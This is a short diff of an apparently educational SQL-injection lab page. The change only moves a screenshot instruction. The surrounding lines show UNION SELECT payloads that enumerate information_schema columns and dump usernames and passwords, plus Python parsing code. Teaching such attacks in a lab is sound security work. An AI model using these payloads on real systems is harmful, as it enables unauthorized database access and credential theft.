@@ -262,9 +262,6 @@ print(f&#34;Found user table of {user_table}&#34;)</code></pre>
 </ul>
 <p>While we now have the name of the user table, we now need to identify the column names for both the usernames and passwords in this table. This can be done by leveraging the <code>information_schema.columns</code> table. As before, if the vulnerable SQL query has 3 columns that are strings, the query below will then return the names of each column in the <code>user_table</code>.</p>
 <pre>&#39; UNION SELECT column_name,null,null from information_schema.columns WHERE table_name=&#39;{user_table}&#39; --</pre>
-<ul>
-<li><strong>Take a screenshot of the results showing the column names of the user table.</strong></li>
-</ul>
 <p>We can easily parse the column names from the output that is returned by the query.</p>
 <pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
 print(resp.text)
@@ -272,6 +269,9 @@ username_col = soup.find(&#39;table&#39;).find(&#39;th&#39;,text=re.compile(&#39
 password_col = soup.find(&#39;table&#39;).find(&#39;th&#39;,text=re.compile(&#39;^password&#39;)).text
 print(f&#34;Found username column of {username_col}&#34;)
 print(f&#34;Found password column of {password_col}&#34;)</code></pre>
+<ul>
+<li><strong>Take a screenshot of the results showing the column names of the user table.</strong></li>
+</ul>
 <p>Now that we know the user table name and the names of its columns, we can now dump the entire database of users via a query similar to below:</p>
 <pre>&#39; UNION SELECT {username_col},{password_col} from {user_table} -- </pre>
 <ul>
